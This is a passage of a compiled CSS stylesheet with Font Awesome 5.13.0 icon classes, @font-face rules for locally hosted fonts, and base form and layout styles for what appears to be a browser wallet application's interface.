      content: "\f5b0"; }
      .fa-plane-slash:before {
      content: "\f969"; }
      .fa-play:before {
      content: "\f04b"; }
      .fa-play-circle:before {
      content: "\f144"; }
      .fa-playstation:before {
      content: "\f3df"; }
      .fa-plug:before {
      content: "\f1e6"; }
      .fa-plus:before {
      content: "\f067"; }
      .fa-plus-circle:before {
      content: "\f055"; }
      .fa-plus-square:before {
      content: "\f0fe"; }
      .fa-podcast:before {
      content: "\f2ce"; }
      .fa-poll:before {
      content: "\f681"; }
      .fa-poll-h:before {
      content: "\f682"; }
      .fa-poo:before {
      content: "\f2fe"; }
      .fa-poo-storm:before {
      content: "\f75a"; }
      .fa-poop:before {
      content: "\f619"; }
      .fa-portrait:before {
      content: "\f3e0"; }
      .fa-pound-sign:before {
      content: "\f154"; }
      .fa-power-off:before {
      content: "\f011"; }
      .fa-pray:before {
      content: "\f683"; }
      .fa-praying-hands:before {
      content: "\f684"; }
      .fa-prescription:before {
      content: "\f5b1"; }
      .fa-prescription-bottle:before {
      content: "\f485"; }
      .fa-prescription-bottle-alt:before {
      content: "\f486"; }
      .fa-print:before {
      content: "\f02f"; }
      .fa-procedures:before {
      content: "\f487"; }
      .fa-product-hunt:before {
      content: "\f288"; }
      .fa-project-diagram:before {
      content: "\f542"; }
      .fa-pump-medical:before {
      content: "\f96a"; }
      .fa-pump-soap:before {
      content: "\f96b"; }
      .fa-pushed:before {
      content: "\f3e1"; }
      .fa-puzzle-piece:before {
      content: "\f12e"; }
      .fa-python:before {
      content: "\f3e2"; }
      .fa-qq:before {
      content: "\f1d6"; }
      .fa-qrcode:before {
      content: "\f029"; }
      .fa-question:before {
      content: "\f128"; }
      .fa-question-circle:before {
      content: "\f059"; }
      .fa-quidditch:before {
      content: "\f458"; }
      .fa-quinscape:before {
      content: "\f459"; }
      .fa-quora:before {
      content: "\f2c4"; }
      .fa-quote-left:before {
      content: "\f10d"; }
      .fa-quote-right:before {
      content: "\f10e"; }
      .fa-quran:before {
      content: "\f687"; }
      .fa-r-project:before {
      content: "\f4f7"; }
      .fa-radiation:before {
      content: "\f7b9"; }
      .fa-radiation-alt:before {
      content: "\f7ba"; }
      .fa-rainbow:before {
      content: "\f75b"; }
      .fa-random:before {
      content: "\f074"; }
      .fa-raspberry-pi:before {
      content: "\f7bb"; }
      .fa-ravelry:before {
      content: "\f2d9"; }
      .fa-react:before {
      content: "\f41b"; }
      .fa-reacteurope:before {
      content: "\f75d"; }
      .fa-readme:before {
      content: "\f4d5"; }
      .fa-rebel:before {
      content: "\f1d0"; }
      .fa-receipt:before {
      content: "\f543"; }
      .fa-record-vinyl:before {
      content: "\f8d9"; }
      .fa-recycle:before {
      content: "\f1b8"; }
      .fa-red-river:before {
      content: "\f3e3"; }
      .fa-reddit:before {
      content: "\f1a1"; }
      .fa-reddit-alien:before {
      content: "\f281"; }
      .fa-reddit-square:before {
      content: "\f1a2"; }
      .fa-redhat:before {
      content: "\f7bc"; }
      .fa-redo:before {
      content: "\f01e"; }
      .fa-redo-alt:before {
      content: "\f2f9"; }
      .fa-registered:before {
      content: "\f25d"; }
      .fa-remove-format:before {
      content: "\f87d"; }
      .fa-renren:before {
      content: "\f18b"; }
      .fa-reply:before {
      content: "\f3e5"; }
      .fa-reply-all:before {
      content: "\f122"; }
      .fa-replyd:before {
      content: "\f3e6"; }
      .fa-republican:before {
      content: "\f75e"; }
      .fa-researchgate:before {
      content: "\f4f8"; }
      .fa-resolving:before {
      content: "\f3e7"; }
      .fa-restroom:before {
      content: "\f7bd"; }
      .fa-retweet:before {
      content: "\f079"; }
      .fa-rev:before {
      content: "\f5b2"; }
      .fa-ribbon:before {
      content: "\f4d6"; }
      .fa-ring:before {
      content: "\f70b"; }
      .fa-road:before {
      content: "\f018"; }
      .fa-robot:before {
      content: "\f544"; }
      .fa-rocket:before {
      content: "\f135"; }
      .fa-rocketchat:before {
      content: "\f3e8"; }
      .fa-rockrms:before {
      content: "\f3e9"; }
      .fa-route:before {
      content: "\f4d7"; }
      .fa-rss:before {
      content: "\f09e"; }
      .fa-rss-square:before {
      content: "\f143"; }
      .fa-ruble-sign:before {
      content: "\f158"; }
      .fa-ruler:before {
      content: "\f545"; }
      .fa-ruler-combined:before {
      content: "\f546"; }
      .fa-ruler-horizontal:before {
      content: "\f547"; }
      .fa-ruler-vertical:before {
      content: "\f548"; }
      .fa-running:before {
      content: "\f70c"; }
      .fa-rupee-sign:before {
      content: "\f156"; }
      .fa-sad-cry:before {
      content: "\f5b3"; }
      .fa-sad-tear:before {
      content: "\f5b4"; }
      .fa-safari:before {
      content: "\f267"; }
      .fa-salesforce:before {
      content: "\f83b"; }
      .fa-sass:before {
      content: "\f41e"; }
      .fa-satellite:before {
      content: "\f7bf"; }
      .fa-satellite-dish:before {
      content: "\f7c0"; }
      .fa-save:before {
      content: "\f0c7"; }
      .fa-schlix:before {
      content: "\f3ea"; }
      .fa-school:before {
      content: "\f549"; }
      .fa-screwdriver:before {
      content: "\f54a"; }
      .fa-scribd:before {
      content: "\f28a"; }
      .fa-scroll:before {
      content: "\f70e"; }
      .fa-sd-card:before {
      content: "\f7c2"; }
      .fa-search:before {
      content: "\f002"; }
      .fa-search-dollar:before {
      content: "\f688"; }
      .fa-search-location:before {
      content: "\f689"; }
      .fa-search-minus:before {
      content: "\f010"; }
      .fa-search-plus:before {
      content: "\f00e"; }
      .fa-searchengin:before {
      content: "\f3eb"; }
      .fa-seedling:before {
      content: "\f4d8"; }
      .fa-sellcast:before {
      content: "\f2da"; }
      .fa-sellsy:before {
      content: "\f213"; }
      .fa-server:before {
      content: "\f233"; }
      .fa-servicestack:before {
      content: "\f3ec"; }
      .fa-shapes:before {
      content: "\f61f"; }
      .fa-share:before {
      content: "\f064"; }
      .fa-share-alt:before {
      content: "\f1e0"; }
      .fa-share-alt-square:before {
      content: "\f1e1"; }
      .fa-share-square:before {
      content: "\f14d"; }
      .fa-shekel-sign:before {
      content: "\f20b"; }
      .fa-shield-alt:before {
      content: "\f3ed"; }
      .fa-shield-virus:before {
      content: "\f96c"; }
      .fa-ship:before {
      content: "\f21a"; }
      .fa-shipping-fast:before {
      content: "\f48b"; }
      .fa-shirtsinbulk:before {
      content: "\f214"; }
      .fa-shoe-prints:before {
      content: "\f54b"; }
      .fa-shopify:before {
      content: "\f957"; }
      .fa-shopping-bag:before {
      content: "\f290"; }
      .fa-shopping-basket:before {
      content: "\f291"; }
      .fa-shopping-cart:before {
      content: "\f07a"; }
      .fa-shopware:before {
      content: "\f5b5"; }
      .fa-shower:before {
      content: "\f2cc"; }
      .fa-shuttle-van:before {
      content: "\f5b6"; }
      .fa-sign:before {
      content: "\f4d9"; }
      .fa-sign-in-alt:before {
      content: "\f2f6"; }
      .fa-sign-language:before {
      content: "\f2a7"; }
      .fa-sign-out-alt:before {
      content: "\f2f5"; }
      .fa-signal:before {
      content: "\f012"; }
      .fa-signature:before {
      content: "\f5b7"; }
      .fa-sim-card:before {
      content: "\f7c4"; }
      .fa-simplybuilt:before {
      content: "\f215"; }
      .fa-sistrix:before {
      content: "\f3ee"; }
      .fa-sitemap:before {
      content: "\f0e8"; }
      .fa-sith:before {
      content: "\f512"; }
      .fa-skating:before {
      content: "\f7c5"; }
      .fa-sketch:before {
      content: "\f7c6"; }
      .fa-skiing:before {
      content: "\f7c9"; }
      .fa-skiing-nordic:before {
      content: "\f7ca"; }
      .fa-skull:before {
      content: "\f54c"; }
      .fa-skull-crossbones:before {
      content: "\f714"; }
      .fa-skyatlas:before {
      content: "\f216"; }
      .fa-skype:before {
      content: "\f17e"; }
      .fa-slack:before {
      content: "\f198"; }
      .fa-slack-hash:before {
      content: "\f3ef"; }
      .fa-slash:before {
      content: "\f715"; }
      .fa-sleigh:before {
      content: "\f7cc"; }
      .fa-sliders-h:before {
      content: "\f1de"; }
      .fa-slideshare:before {
      content: "\f1e7"; }
      .fa-smile:before {
      content: "\f118"; }
      .fa-smile-beam:before {
      content: "\f5b8"; }
      .fa-smile-wink:before {
      content: "\f4da"; }
      .fa-smog:before {
      content: "\f75f"; }
      .fa-smoking:before {
      content: "\f48d"; }
      .fa-smoking-ban:before {
      content: "\f54d"; }
      .fa-sms:before {
      content: "\f7cd"; }
      .fa-snapchat:before {
      content: "\f2ab"; }
      .fa-snapchat-ghost:before {
      content: "\f2ac"; }
      .fa-snapchat-square:before {
      content: "\f2ad"; }
      .fa-snowboarding:before {
      content: "\f7ce"; }
      .fa-snowflake:before {
      content: "\f2dc"; }
      .fa-snowman:before {
      content: "\f7d0"; }
      .fa-snowplow:before {
      content: "\f7d2"; }
      .fa-soap:before {
      content: "\f96e"; }
      .fa-socks:before {
      content: "\f696"; }
      .fa-solar-panel:before {
      content: "\f5ba"; }
      .fa-sort:before {
      content: "\f0dc"; }
      .fa-sort-alpha-down:before {
      content: "\f15d"; }
      .fa-sort-alpha-down-alt:before {
      content: "\f881"; }
      .fa-sort-alpha-up:before {
      content: "\f15e"; }
      .fa-sort-alpha-up-alt:before {
      content: "\f882"; }
      .fa-sort-amount-down:before {
      content: "\f160"; }
      .fa-sort-amount-down-alt:before {
      content: "\f884"; }
      .fa-sort-amount-up:before {
      content: "\f161"; }
      .fa-sort-amount-up-alt:before {
      content: "\f885"; }
      .fa-sort-down:before {
      content: "\f0dd"; }
      .fa-sort-numeric-down:before {
      content: "\f162"; }
      .fa-sort-numeric-down-alt:before {
      content: "\f886"; }
      .fa-sort-numeric-up:before {
      content: "\f163"; }
      .fa-sort-numeric-up-alt:before {
      content: "\f887"; }
      .fa-sort-up:before {
      content: "\f0de"; }
      .fa-soundcloud:before {
      content: "\f1be"; }
      .fa-sourcetree:before {
      content: "\f7d3"; }
      .fa-spa:before {
      content: "\f5bb"; }
      .fa-space-shuttle:before {
      content: "\f197"; }
      .fa-speakap:before {
      content: "\f3f3"; }
      .fa-speaker-deck:before {
      content: "\f83c"; }
      .fa-spell-check:before {
      content: "\f891"; }
      .fa-spider:before {
      content: "\f717"; }
      .fa-spinner:before {
      content: "\f110"; }
      .fa-splotch:before {
      content: "\f5bc"; }
      .fa-spotify:before {
      content: "\f1bc"; }
      .fa-spray-can:before {
      content: "\f5bd"; }
      .fa-square:before {
      content: "\f0c8"; }
      .fa-square-full:before {
      content: "\f45c"; }
      .fa-square-root-alt:before {
      content: "\f698"; }
      .fa-squarespace:before {
      content: "\f5be"; }
      .fa-stack-exchange:before {
      content: "\f18d"; }
      .fa-stack-overflow:before {
      content: "\f16c"; }
      .fa-stackpath:before {
      content: "\f842"; }
      .fa-stamp:before {
      content: "\f5bf"; }
      .fa-star:before {
      content: "\f005"; }
      .fa-star-and-crescent:before {
      content: "\f699"; }
      .fa-star-half:before {
      content: "\f089"; }
      .fa-star-half-alt:before {
      content: "\f5c0"; }
      .fa-star-of-david:before {
      content: "\f69a"; }
      .fa-star-of-life:before {
      content: "\f621"; }
      .fa-staylinked:before {
      content: "\f3f5"; }
      .fa-steam:before {
      content: "\f1b6"; }
      .fa-steam-square:before {
      content: "\f1b7"; }
      .fa-steam-symbol:before {
      content: "\f3f6"; }
      .fa-step-backward:before {
      content: "\f048"; }
      .fa-step-forward:before {
      content: "\f051"; }
      .fa-stethoscope:before {
      content: "\f0f1"; }
      .fa-sticker-mule:before {
      content: "\f3f7"; }
      .fa-sticky-note:before {
      content: "\f249"; }
      .fa-stop:before {
      content: "\f04d"; }
      .fa-stop-circle:before {
      content: "\f28d"; }
      .fa-stopwatch:before {
      content: "\f2f2"; }
      .fa-stopwatch-20:before {
      content: "\f96f"; }
      .fa-store:before {
      content: "\f54e"; }
      .fa-store-alt:before {
      content: "\f54f"; }
      .fa-store-alt-slash:before {
      content: "\f970"; }
      .fa-store-slash:before {
      content: "\f971"; }
      .fa-strava:before {
      content: "\f428"; }
      .fa-stream:before {
      content: "\f550"; }
      .fa-street-view:before {
      content: "\f21d"; }
      .fa-strikethrough:before {
      content: "\f0cc"; }
      .fa-stripe:before {
      content: "\f429"; }
      .fa-stripe-s:before {
      content: "\f42a"; }
      .fa-stroopwafel:before {
      content: "\f551"; }
      .fa-studiovinari:before {
      content: "\f3f8"; }
      .fa-stumbleupon:before {
      content: "\f1a4"; }
      .fa-stumbleupon-circle:before {
      content: "\f1a3"; }
      .fa-subscript:before {
      content: "\f12c"; }
      .fa-subway:before {
      content: "\f239"; }
      .fa-suitcase:before {
      content: "\f0f2"; }
      .fa-suitcase-rolling:before {
      content: "\f5c1"; }
      .fa-sun:before {
      content: "\f185"; }
      .fa-superpowers:before {
      content: "\f2dd"; }
      .fa-superscript:before {
      content: "\f12b"; }
      .fa-supple:before {
      content: "\f3f9"; }
      .fa-surprise:before {
      content: "\f5c2"; }
      .fa-suse:before {
      content: "\f7d6"; }
      .fa-swatchbook:before {
      content: "\f5c3"; }
      .fa-swift:before {
      content: "\f8e1"; }
      .fa-swimmer:before {
      content: "\f5c4"; }
      .fa-swimming-pool:before {
      content: "\f5c5"; }
      .fa-symfony:before {
      content: "\f83d"; }
      .fa-synagogue:before {
      content: "\f69b"; }
      .fa-sync:before {
      content: "\f021"; }
      .fa-sync-alt:before {
      content: "\f2f1"; }
      .fa-syringe:before {
      content: "\f48e"; }
      .fa-table:before {
      content: "\f0ce"; }
      .fa-table-tennis:before {
      content: "\f45d"; }
      .fa-tablet:before {
      content: "\f10a"; }
      .fa-tablet-alt:before {
      content: "\f3fa"; }
      .fa-tablets:before {
      content: "\f490"; }
      .fa-tachometer-alt:before {
      content: "\f3fd"; }
      .fa-tag:before {
      content: "\f02b"; }
      .fa-tags:before {
      content: "\f02c"; }
      .fa-tape:before {
      content: "\f4db"; }
      .fa-tasks:before {
      content: "\f0ae"; }
      .fa-taxi:before {
      content: "\f1ba"; }
      .fa-teamspeak:before {
      content: "\f4f9"; }
      .fa-teeth:before {
      content: "\f62e"; }
      .fa-teeth-open:before {
      content: "\f62f"; }
      .fa-telegram:before {
      content: "\f2c6"; }
      .fa-telegram-plane:before {
      content: "\f3fe"; }
      .fa-temperature-high:before {
      content: "\f769"; }
      .fa-temperature-low:before {
      content: "\f76b"; }
      .fa-tencent-weibo:before {
      content: "\f1d5"; }
      .fa-tenge:before {
      content: "\f7d7"; }
      .fa-terminal:before {
      content: "\f120"; }
      .fa-text-height:before {
      content: "\f034"; }
      .fa-text-width:before {
      content: "\f035"; }
      .fa-th:before {
      content: "\f00a"; }
      .fa-th-large:before {
      content: "\f009"; }
      .fa-th-list:before {
      content: "\f00b"; }
      .fa-the-red-yeti:before {
      content: "\f69d"; }
      .fa-theater-masks:before {
      content: "\f630"; }
      .fa-themeco:before {
      content: "\f5c6"; }
      .fa-themeisle:before {
      content: "\f2b2"; }
      .fa-thermometer:before {
      content: "\f491"; }
      .fa-thermometer-empty:before {
      content: "\f2cb"; }
      .fa-thermometer-full:before {
      content: "\f2c7"; }
      .fa-thermometer-half:before {
      content: "\f2c9"; }
      .fa-thermometer-quarter:before {
      content: "\f2ca"; }
      .fa-thermometer-three-quarters:before {
      content: "\f2c8"; }
      .fa-think-peaks:before {
      content: "\f731"; }
      .fa-thumbs-down:before {
      content: "\f165"; }
      .fa-thumbs-up:before {
      content: "\f164"; }
      .fa-thumbtack:before {
      content: "\f08d"; }
      .fa-ticket-alt:before {
      content: "\f3ff"; }
      .fa-times:before {
      content: "\f00d"; }
      .fa-times-circle:before {
      content: "\f057"; }
      .fa-tint:before {
      content: "\f043"; }
      .fa-tint-slash:before {
      content: "\f5c7"; }
      .fa-tired:before {
      content: "\f5c8"; }
      .fa-toggle-off:before {
      content: "\f204"; }
      .fa-toggle-on:before {
      content: "\f205"; }
      .fa-toilet:before {
      content: "\f7d8"; }
      .fa-toilet-paper:before {
      content: "\f71e"; }
      .fa-toilet-paper-slash:before {
      content: "\f972"; }
      .fa-toolbox:before {
      content: "\f552"; }
      .fa-tools:before {
      content: "\f7d9"; }
      .fa-tooth:before {
      content: "\f5c9"; }
      .fa-torah:before {
      content: "\f6a0"; }
      .fa-torii-gate:before {
      content: "\f6a1"; }
      .fa-tractor:before {
      content: "\f722"; }
      .fa-trade-federation:before {
      content: "\f513"; }
      .fa-trademark:before {
      content: "\f25c"; }
      .fa-traffic-light:before {
      content: "\f637"; }
      .fa-trailer:before {
      content: "\f941"; }
      .fa-train:before {
      content: "\f238"; }
      .fa-tram:before {
      content: "\f7da"; }
      .fa-transgender:before {
      content: "\f224"; }
      .fa-transgender-alt:before {
      content: "\f225"; }
      .fa-trash:before {
      content: "\f1f8"; }
      .fa-trash-alt:before {
      content: "\f2ed"; }
      .fa-trash-restore:before {
      content: "\f829"; }
      .fa-trash-restore-alt:before {
      content: "\f82a"; }
      .fa-tree:before {
      content: "\f1bb"; }
      .fa-trello:before {
      content: "\f181"; }
      .fa-tripadvisor:before {
      content: "\f262"; }
      .fa-trophy:before {
      content: "\f091"; }
      .fa-truck:before {
      content: "\f0d1"; }
      .fa-truck-loading:before {
      content: "\f4de"; }
      .fa-truck-monster:before {
      content: "\f63b"; }
      .fa-truck-moving:before {
      content: "\f4df"; }
      .fa-truck-pickup:before {
      content: "\f63c"; }
      .fa-tshirt:before {
      content: "\f553"; }
      .fa-tty:before {
      content: "\f1e4"; }
      .fa-tumblr:before {
      content: "\f173"; }
      .fa-tumblr-square:before {
      content: "\f174"; }
      .fa-tv:before {
      content: "\f26c"; }
      .fa-twitch:before {
      content: "\f1e8"; }
      .fa-twitter:before {
      content: "\f099"; }
      .fa-twitter-square:before {
      content: "\f081"; }
      .fa-typo3:before {
      content: "\f42b"; }
      .fa-uber:before {
      content: "\f402"; }
      .fa-ubuntu:before {
      content: "\f7df"; }
      .fa-uikit:before {
      content: "\f403"; }
      .fa-umbraco:before {
      content: "\f8e8"; }
      .fa-umbrella:before {
      content: "\f0e9"; }
      .fa-umbrella-beach:before {
      content: "\f5ca"; }
      .fa-underline:before {
      content: "\f0cd"; }
      .fa-undo:before {
      content: "\f0e2"; }
      .fa-undo-alt:before {
      content: "\f2ea"; }
      .fa-uniregistry:before {
      content: "\f404"; }
      .fa-unity:before {
      content: "\f949"; }
      .fa-universal-access:before {
      content: "\f29a"; }
      .fa-university:before {
      content: "\f19c"; }
      .fa-unlink:before {
      content: "\f127"; }
      .fa-unlock:before {
      content: "\f09c"; }
      .fa-unlock-alt:before {
      content: "\f13e"; }
      .fa-untappd:before {
      content: "\f405"; }
      .fa-upload:before {
      content: "\f093"; }
      .fa-ups:before {
      content: "\f7e0"; }
      .fa-usb:before {
      content: "\f287"; }
      .fa-user:before {
      content: "\f007"; }
      .fa-user-alt:before {
      content: "\f406"; }
      .fa-user-alt-slash:before {
      content: "\f4fa"; }
      .fa-user-astronaut:before {
      content: "\f4fb"; }
      .fa-user-check:before {
      content: "\f4fc"; }
      .fa-user-circle:before {
      content: "\f2bd"; }
      .fa-user-clock:before {
      content: "\f4fd"; }
      .fa-user-cog:before {
      content: "\f4fe"; }
      .fa-user-edit:before {
      content: "\f4ff"; }
      .fa-user-friends:before {
      content: "\f500"; }
      .fa-user-graduate:before {
      content: "\f501"; }
      .fa-user-injured:before {
      content: "\f728"; }
      .fa-user-lock:before {
      content: "\f502"; }
      .fa-user-md:before {
      content: "\f0f0"; }
      .fa-user-minus:before {
      content: "\f503"; }
      .fa-user-ninja:before {
      content: "\f504"; }
      .fa-user-nurse:before {
      content: "\f82f"; }
      .fa-user-plus:before {
      content: "\f234"; }
      .fa-user-secret:before {
      content: "\f21b"; }
      .fa-user-shield:before {
      content: "\f505"; }
      .fa-user-slash:before {
      content: "\f506"; }
      .fa-user-tag:before {
      content: "\f507"; }
      .fa-user-tie:before {
      content: "\f508"; }
      .fa-user-times:before {
      content: "\f235"; }
      .fa-users:before {
      content: "\f0c0"; }
      .fa-users-cog:before {
      content: "\f509"; }
      .fa-usps:before {
      content: "\f7e1"; }
      .fa-ussunnah:before {
      content: "\f407"; }
      .fa-utensil-spoon:before {
      content: "\f2e5"; }
      .fa-utensils:before {
      content: "\f2e7"; }
      .fa-vaadin:before {
      content: "\f408"; }
      .fa-vector-square:before {
      content: "\f5cb"; }
      .fa-venus:before {
      content: "\f221"; }
      .fa-venus-double:before {
      content: "\f226"; }
      .fa-venus-mars:before {
      content: "\f228"; }
      .fa-viacoin:before {
      content: "\f237"; }
      .fa-viadeo:before {
      content: "\f2a9"; }
      .fa-viadeo-square:before {
      content: "\f2aa"; }
      .fa-vial:before {
      content: "\f492"; }
      .fa-vials:before {
      content: "\f493"; }
      .fa-viber:before {
      content: "\f409"; }
      .fa-video:before {
      content: "\f03d"; }
      .fa-video-slash:before {
      content: "\f4e2"; }
      .fa-vihara:before {
      content: "\f6a7"; }
      .fa-vimeo:before {
      content: "\f40a"; }
      .fa-vimeo-square:before {
      content: "\f194"; }
      .fa-vimeo-v:before {
      content: "\f27d"; }
      .fa-vine:before {
      content: "\f1ca"; }
      .fa-virus:before {
      content: "\f974"; }
      .fa-virus-slash:before {
      content: "\f975"; }
      .fa-viruses:before {
      content: "\f976"; }
      .fa-vk:before {
      content: "\f189"; }
      .fa-vnv:before {
      content: "\f40b"; }
      .fa-voicemail:before {
      content: "\f897"; }
      .fa-volleyball-ball:before {
      content: "\f45f"; }
      .fa-volume-down:before {
      content: "\f027"; }
      .fa-volume-mute:before {
      content: "\f6a9"; }
      .fa-volume-off:before {
      content: "\f026"; }
      .fa-volume-up:before {
      content: "\f028"; }
      .fa-vote-yea:before {
      content: "\f772"; }
      .fa-vr-cardboard:before {
      content: "\f729"; }
      .fa-vuejs:before {
      content: "\f41f"; }
      .fa-walking:before {
      content: "\f554"; }
      .fa-wallet:before {
      content: "\f555"; }
      .fa-warehouse:before {
      content: "\f494"; }
      .fa-water:before {
      content: "\f773"; }
      .fa-wave-square:before {
      content: "\f83e"; }
      .fa-waze:before {
      content: "\f83f"; }
      .fa-weebly:before {
      content: "\f5cc"; }
      .fa-weibo:before {
      content: "\f18a"; }
      .fa-weight:before {
      content: "\f496"; }
      .fa-weight-hanging:before {
      content: "\f5cd"; }
      .fa-weixin:before {
      content: "\f1d7"; }
      .fa-whatsapp:before {
      content: "\f232"; }
      .fa-whatsapp-square:before {
      content: "\f40c"; }
      .fa-wheelchair:before {
      content: "\f193"; }
      .fa-whmcs:before {
      content: "\f40d"; }
      .fa-wifi:before {
      content: "\f1eb"; }
      .fa-wikipedia-w:before {
      content: "\f266"; }
      .fa-wind:before {
      content: "\f72e"; }
      .fa-window-close:before {
      content: "\f410"; }
      .fa-window-maximize:before {
      content: "\f2d0"; }
      .fa-window-minimize:before {
      content: "\f2d1"; }
      .fa-window-restore:before {
      content: "\f2d2"; }
      .fa-windows:before {
      content: "\f17a"; }
      .fa-wine-bottle:before {
      content: "\f72f"; }
      .fa-wine-glass:before {
      content: "\f4e3"; }
      .fa-wine-glass-alt:before {
      content: "\f5ce"; }
      .fa-wix:before {
      content: "\f5cf"; }
      .fa-wizards-of-the-coast:before {
      content: "\f730"; }
      .fa-wolf-pack-battalion:before {
      content: "\f514"; }
      .fa-won-sign:before {
      content: "\f159"; }
      .fa-wordpress:before {
      content: "\f19a"; }
      .fa-wordpress-simple:before {
      content: "\f411"; }
      .fa-wpbeginner:before {
      content: "\f297"; }
      .fa-wpexplorer:before {
      content: "\f2de"; }
      .fa-wpforms:before {
      content: "\f298"; }
      .fa-wpressr:before {
      content: "\f3e4"; }
      .fa-wrench:before {
      content: "\f0ad"; }
      .fa-x-ray:before {
      content: "\f497"; }
      .fa-xbox:before {
      content: "\f412"; }
      .fa-xing:before {
      content: "\f168"; }
      .fa-xing-square:before {
      content: "\f169"; }
      .fa-y-combinator:before {
      content: "\f23b"; }
      .fa-yahoo:before {
      content: "\f19e"; }
      .fa-yammer:before {
      content: "\f840"; }
      .fa-yandex:before {
      content: "\f413"; }
      .fa-yandex-international:before {
      content: "\f414"; }
      .fa-yarn:before {
      content: "\f7e3"; }
      .fa-yelp:before {
      content: "\f1e9"; }
      .fa-yen-sign:before {
      content: "\f157"; }
      .fa-yin-yang:before {
      content: "\f6ad"; }
      .fa-yoast:before {
      content: "\f2b1"; }
      .fa-youtube:before {
      content: "\f167"; }
      .fa-youtube-square:before {
      content: "\f431"; }
      .fa-zhihu:before {
      content: "\f63f"; }
      .sr-only {
      border: 0;
      clip: rect(0, 0, 0, 0);
      height: 1px;
      margin: -1px;
      overflow: hidden;
      padding: 0;
      position: absolute;
      width: 1px; }
      .sr-only-focusable:active, .sr-only-focusable:focus {
      clip: auto;
      height: auto;
      margin: 0;
      overflow: visible;
      position: static;
      width: auto; }
      /*!
      * Font Awesome Free 5.13.0 by @fontawesome - https://fontawesome.com
      * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)
      */
      @font-face {
      font-family: 'Font Awesome 5 Free';
      font-style: normal;
      font-weight: 900;
      font-display: block;
      src: url("fonts/fontawesome/fa-solid-900.eot");
      src: url("fonts/fontawesome/fa-solid-900.eot?#iefix") format("embedded-opentype"), url("fonts/fontawesome/fa-solid-900.woff2") format("woff2"), url("fonts/fontawesome/fa-solid-900.woff") format("woff"), url("fonts/fontawesome/fa-solid-900.ttf") format("truetype"), url("fonts/fontawesome/fa-solid-900.svg#fontawesome") format("svg"); }
      .fa,
      .fas {
      font-family: 'Font Awesome 5 Free';
      font-weight: 900; }
      /*!
      * Font Awesome Free 5.13.0 by @fontawesome - https://fontawesome.com
      * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)
      */
      @font-face {
      font-family: 'Font Awesome 5 Free';
      font-style: normal;
      font-weight: 400;
      font-display: block;
      src: url("fonts/fontawesome/fa-regular-400.eot");
      src: url("fonts/fontawesome/fa-regular-400.eot?#iefix") format("embedded-opentype"), url("fonts/fontawesome/fa-regular-400.woff2") format("woff2"), url("fonts/fontawesome/fa-regular-400.woff") format("woff"), url("fonts/fontawesome/fa-regular-400.ttf") format("truetype"), url("fonts/fontawesome/fa-regular-400.svg#fontawesome") format("svg"); }
      .far {
      font-family: 'Font Awesome 5 Free';
      font-weight: 400; }
      @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 100;
      src: local("Roboto Thin"), local("Roboto-Thin"), url("fonts/Roboto/Roboto-Thin.ttf") format("truetype"); }
      @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      src: local("Roboto Light"), local("Roboto-Light"), url("fonts/Roboto/Roboto-Light.ttf") format("truetype"); }
      @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      src: local("Roboto"), local("Roboto-Regular"), url("fonts/Roboto/Roboto-Regular.ttf") format("truetype"); }
      @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      src: local("Roboto Medium"), local("Roboto-Medium"), url("fonts/Roboto/Roboto-Medium.ttf") format("truetype"); }
      @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 700;
      src: local("Roboto Bold"), local("Roboto-Bold"), url("fonts/Roboto/Roboto-Bold.ttf") format("truetype"); }
      @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 900;
      src: local("Roboto Black"), local("Roboto-Black"), url("fonts/Roboto/Roboto-Black.ttf") format("truetype"); }
      @font-face {
      font-family: 'Euclid';
      font-style: normal;
      font-weight: 400;
      src: url("fonts/Euclid/EuclidCircularB-Regular-WebXL.ttf") format("truetype"); }
      @font-face {
      font-family: 'Euclid';
      font-style: italic;
      font-weight: 400;
      src: url("fonts/Euclid/EuclidCircularB-RegularItalic-WebXL.ttf") format("truetype"); }
      @font-face {
      font-family: 'Euclid';
      font-style: normal;
      font-weight: 700;
      src: url("fonts/Euclid/EuclidCircularB-Bold-WebXL.ttf") format("truetype"); }
      /*
      Z-Indicies
      */
      * {
      box-sizing: border-box; }
      html,
      body {
      color: #4d4d4d;
      width: 100%;
      height: 100%;
      margin: 0;
      padding: 0;
      font-size: 16px;
      overflow: auto; }
      html {
      min-height: 500px; }
      .mouse-user-styles button:focus,
      .mouse-user-styles input:focus,
      .mouse-user-styles textarea:focus,
      .mouse-user-styles .unit-input__input,
      .mouse-user-styles .currency-display__input {
      outline: none; }
      /*
      This error class is used in the following files still:
      /ui/app/pages/create-account/connect-hardware/index.js
      /ui/app/pages/create-account/import-account/json.js
      /ui/app/pages/create-account/import-account/private-key.js
      /ui/app/pages/first-time-flow/create-password/import-with-seed-phrase/import-with-seed-phrase.component.js
      /ui/app/pages/keychains/restore-vault.js
      */
      .error {
      color: #f7861c;
      margin-top: 3px;
      margin-bottom: 9px; }
      /*
      This warning class is used in the following files still:
      /ui/app/pages/create-account/import-account/json.js
      /ui/app/pages/confirm-add-suggested-token/confirm-add-suggested-token.component.js
      */
      .warning {
      color: #ffae00; }
      /* stylelint-disable */
      #app-content {
      overflow-x: hidden;
      height: 100%;
      display: flex;
      flex-direction: column;
      background: #f7f7f7; }
      @media screen and (max-width: 575px) {
      #app-content {
      background-color: #fff; } }
      /* stylelint-enable */
      a {
      text-decoration: none;
      color: inherit; }
      a:hover {
      color: #df6b0e; }
      input.large-input,
      textarea.large-input {
      padding: 8px; }
      input.large-input {
      height: 36px; }
      .allcaps {
      text-transform: uppercase; }
      .input-label {
      padding-bottom: 10px;
      font-weight: 400;
      display: inline-block; }
      input.form-control {
      padding-left: 10px;
      font-size: 14px;
      height: 40px;
      border: 1px solid #dedede;
      border-radius: 3px;
      width: 100%; }
      input.form-control::-webkit-input-placeholder {
      font-weight: 100;
      color: #9b9b9b; }
      input.form-control::-moz-placeholder {
      font-weight: 100;
      color: #9b9b9b; }
      input.form-control:-ms-input-placeholder {
      font-weight: 100;
      color: #9b9b9b; }
      input.form-control:-moz-placeholder {
      font-weight: 100;
      color: #9b9b9b; }
      input.form-control--error {
